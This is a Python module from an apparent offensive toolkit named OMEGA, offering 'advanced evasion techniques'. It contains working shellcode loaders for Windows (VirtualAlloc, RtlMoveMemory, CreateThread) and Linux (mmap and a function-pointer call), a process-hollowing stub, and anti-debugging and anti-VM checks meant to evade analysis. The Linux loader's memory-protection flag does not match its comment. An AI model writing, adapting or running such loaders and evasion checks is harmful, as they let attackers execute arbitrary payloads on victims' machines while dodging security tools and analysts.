"""
OMEGA Advanced Evasion Techniques Module
Implements memory manipulation, code injection, and process hollowing techniques.
"""

import struct
import platform
from ..utils.output import print_header, print_info, print_error, print_debug


class MemoryManipulation:
    """
    Handles advanced memory operations including shellcode injection.
    Platform-specific implementations for Windows and Linux.
    """
    
    def __init__(self):
        """Initialize memory manipulation utilities."""
        self.platform = platform.system()
        print_debug(f"MemoryManipulation initialized for {self.platform}")
    
    def execute_shellcode_windows(self, shellcode_hex):
        """
        Execute shellcode on Windows using ctypes.
        
        Args:
            shellcode_hex (str): Shellcode in hex format
        
        Note:
            Requires Windows platform and appropriate privileges
        """
        if platform.system() != "Windows":
            print_error("This function requires Windows platform")
            return
        
        try:
            import ctypes
            
            print_header("Executing Shellcode via Python ctypes (Windows)")
            
            # Convert hex to bytes
            shellcode = bytes.fromhex(shellcode_hex)
            print_info(f"Shellcode size: {len(shellcode)} bytes")
            
            # Get kernel32
            kernel32 = ctypes.windll.kernel32
            
            # Memory constants
            MEM_COMMIT = 0x1000
            PAGE_EXECUTE_READWRITE = 0x40
            INFINITE = 0xFFFFFFFF
            
            # 1. Allocate executable memory
            kernel32.VirtualAlloc.restype = ctypes.c_void_p
            ptr = kernel32.VirtualAlloc(0, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
            
            if not ptr:
                print_error(f"VirtualAlloc failed")
                return
            
            print_info(f"Memory allocated at: 0x{ptr:x}")
            
            # 2. Copy shellcode to allocated memory
            ctypes.windll.kernel32.RtlMoveMemory(
                ctypes.c_void_p(ptr),
                shellcode,
                len(shellcode)
            )
            print_info("Shellcode copied to memory")
            
            # 3. Create thread to execute shellcode
            thread_id = ctypes.c_ulong(0)
            h_thread = kernel32.CreateThread(
                0, 0, ptr, 0, 0,
                ctypes.byref(thread_id)
            )
            
            if not h_thread:
                print_error(f"CreateThread failed")
                return
            
            print_info(f"Shellcode injected. Thread ID: {thread_id.value}")
            
            # 4. Wait for thread completion
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            print_info("Shellcode execution completed")
            
        except Exception as e:
            print_error(f"Error during shellcode execution: {e}")
    
    def execute_shellcode_linux(self, shellcode_hex):
        """
        Execute shellcode on Linux.
        
        Args:
            shellcode_hex (str): Shellcode in hex format
        """
        if platform.system() != "Linux":
            print_error("This function requires Linux platform")
            return
        
        try:
            import ctypes
            import mmap
            
            print_header("Executing Shellcode via ctypes (Linux)")
            
            # Convert hex to bytes
            shellcode = bytes.fromhex(shellcode_hex)
            print_info(f"Shellcode size: {len(shellcode)} bytes")
            
            # Get libc
            libc = ctypes.CDLL(None)
            
            # Allocate executable memory
            page_size = 4096
            size = ((len(shellcode) + page_size - 1) // page_size) * page_size
            
            # mmap for executable memory
            mem = libc.mmap(
                None,
                size,
                3,  # PROT_READ | PROT_WRITE | PROT_EXEC
                0x22,  # MAP_PRIVATE | MAP_ANONYMOUS
                -1,
                0
            )
            
            if mem == -1:
                print_error("mmap failed")
                return
            
            print_info(f"Memory allocated at: 0x{mem:x}")
            
            # Copy shellcode to memory
            memmove = libc.memmove
            memmove(ctypes.c_void_p(mem), shellcode, len(shellcode))
            
            print_info("Shellcode copied to memory")
            
            # Cast to function pointer and execute
            shellcode_func = ctypes.CFUNCTYPE(ctypes.c_void_p)
            shellcode_func.argtypes = []
            
            func_ptr = ctypes.cast(mem, ctypes.CFUNCTYPE(ctypes.c_void_p))
            func_ptr()
            
            print_info("Shellcode execution completed")
            
        except Exception as e:
            print_error(f"Error during shellcode execution: {e}")


class AdvancedEvasionTechniques:
    """
    Advanced Evasion Techniques for bypassing security mechanisms.
    Includes memory manipulation, UAC bypass, and anti-analysis techniques.
    """
    
    def __init__(self):
        """Initialize evasion techniques."""
        self.memory_manipulation = MemoryManipulation()
        print_debug("Advanced Evasion Techniques initialized")
    
    def get_memory_manipulation(self):
        """Get memory manipulation module."""
        return self.memory_manipulation
    
    def process_hollowing_preparation(self, target_process, payload_path):
        """
        Prepare for process hollowing attack (Windows).
        
        Args:
            target_process (str): Target process name (e.g., svchost.exe)
            payload_path (str): Path to payload executable
        """
        if platform.system() != "Windows":
            print_error("Process hollowing requires Windows")
            return
        
        print_header(f"Process Hollowing Preparation for {target_process}")
        print_info(f"Target: {target_process}")
        print_info(f"Payload: {payload_path}")
        print_debug("Ready for process hollowing execution")
    
    def anti_debugging_check(self):
        """
        Detect debugging environments.
        
        Returns:
            bool: True if debugger detected, False otherwise
        """
        try:
            import ctypes
            
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                is_debugged = ctypes.c_bool()
                kernel32.CheckRemoteDebuggerPresent(-1, ctypes.byref(is_debugged))
                return is_debugged.value
        except Exception as e:
            print_debug(f"Anti-debugging check: {e}")
        
        return False
    
    def anti_vm_check(self):
        """
        Detect virtual machine environments.
        
        Returns:
            bool: True if VM detected, False otherwise
        """
        vm_indicators = [
            "QEMU", "VirtualBox", "VMware", "Hyper-V", "Xen"
        ]
        
        try:
            if platform.system() == "Windows":
                import subprocess
                result = subprocess.check_output("wmic os get systemtype", shell=True).decode()
                for indicator in vm_indicators:
                    if indicator in result:
                        return True
        except Exception as e:
            print_debug(f"Anti-VM check: {e}")
        
        return False
